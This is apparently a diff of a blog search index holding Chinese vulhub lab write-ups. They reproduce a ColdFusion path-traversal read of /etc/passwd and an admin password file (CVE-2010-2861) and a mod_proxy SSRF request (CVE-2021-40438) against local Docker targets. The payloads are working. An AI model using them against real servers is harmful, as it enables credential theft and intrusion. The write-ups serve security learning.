@@ -1,78 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
-    <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
-<ol>
-<li>复现环境中的任意文件读取漏洞，截图证明</li>
-<li>尝试利用漏洞读取目标系统中的”&#x2F;opt&#x2F;coldfusion8&#x2F;license.txt”文件，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>启动后，访问</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code></p>
-<p>可以看到初始化页面，输入密码<code>admin</code>，最后点击ok，开始初始化整个环境。</p>
-<img data-src="https://images.gaifagafin.top/202311112129162.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用另外一个浏览器直接访问</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code></p>
-<p>即可读取文件<code>/etc/passwd</code></p>
-<p>我这里在浏览器访问：</p>
-<p><a href="http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</a></p>
-<img data-src="https://images.gaifagafin.top/202311112129495.png" style="zoom:67%;" />
-
-<p>读取后台管理员密码</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
-<img data-src="https://images.gaifagafin.top/202311112129747.png" style="zoom:67%;" />
-
-<h2 id="读取license-txt文件"><a href="#读取license-txt文件" class="headerlink" title="读取license.txt文件"></a>读取license.txt文件</h2><p>根据上面的漏洞复现，构造出payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../license.txt%00en</span><br></pre></td></tr></table></figure>
-
-<p>浏览器输入payload得到license.txt</p>
-<img data-src="https://images.gaifagafin.top/202311112129711.png" style="zoom:67%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)</title>
-    <url>/2023/11/22/Apache-HTTPD-2-4-48-mod-proxy-SSRF%E6%BC%8F%E6%B4%9E-CVE-2021-40438/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache HTTPD 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）</p>
-<ol>
-<li>复现环境中的SSRF漏洞，截图证明</li>
-<li>尝试利用SSRF漏洞，访问重庆邮电大学官网（<a href="http://www.cqupt.edu.cn/%EF%BC%89">http://www.cqupt.edu.cn/）</a></li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞目录执行如下命令编译及运行一个Apache HTTP Server 2.4.43服务器：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>服务器启动后，访问8080端口可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>发送如下数据包，可见我们已经成功请求到<code>http://example.com</code>的页面并返回：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311222300967.png" alt="返回页面" style="zoom:80%;" />
-
-<h1 id="访问重邮官网"><a href="#访问重邮官网" class="headerlink" title="访问重邮官网"></a>访问重邮官网</h1><p>只需要将上面payload的example的url改成重邮的官网，构造http请求：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.cqupt.edu.cn/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发送请求，成功访问重邮官网</p>
-<img data-src="https://images.gaifagafin.top/202311222300054.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</title>
     <url>/2023/11/23/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437/</url>
     <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</p>
@@ -125,8 +53,192 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
+    <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
+<ol>
+<li>复现环境中的任意文件读取漏洞，截图证明</li>
+<li>尝试利用漏洞读取目标系统中的”&#x2F;opt&#x2F;coldfusion8&#x2F;license.txt”文件，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>启动后，访问</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code></p>
+<p>可以看到初始化页面，输入密码<code>admin</code>，最后点击ok，开始初始化整个环境。</p>
+<img data-src="https://images.gaifagafin.top/202311112129162.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用另外一个浏览器直接访问</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code></p>
+<p>即可读取文件<code>/etc/passwd</code></p>
+<p>我这里在浏览器访问：</p>
+<p><a href="http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</a></p>
+<img data-src="https://images.gaifagafin.top/202311112129495.png" style="zoom:67%;" />
+
+<p>读取后台管理员密码</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
+<img data-src="https://images.gaifagafin.top/202311112129747.png" style="zoom:67%;" />
+
+<h2 id="读取license-txt文件"><a href="#读取license-txt文件" class="headerlink" title="读取license.txt文件"></a>读取license.txt文件</h2><p>根据上面的漏洞复现，构造出payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../license.txt%00en</span><br></pre></td></tr></table></figure>
+
+<p>浏览器输入payload得到license.txt</p>
+<img data-src="https://images.gaifagafin.top/202311112129711.png" style="zoom:67%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)</title>
+    <url>/2023/11/22/Apache-HTTPD-2-4-48-mod-proxy-SSRF%E6%BC%8F%E6%B4%9E-CVE-2021-40438/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache HTTPD 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）</p>
+<ol>
+<li>复现环境中的SSRF漏洞，截图证明</li>
+<li>尝试利用SSRF漏洞，访问重庆邮电大学官网（<a href="http://www.cqupt.edu.cn/%EF%BC%89">http://www.cqupt.edu.cn/）</a></li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞目录执行如下命令编译及运行一个Apache HTTP Server 2.4.43服务器：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>服务器启动后，访问8080端口可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>发送如下数据包，可见我们已经成功请求到<code>http://example.com</code>的页面并返回：</p>
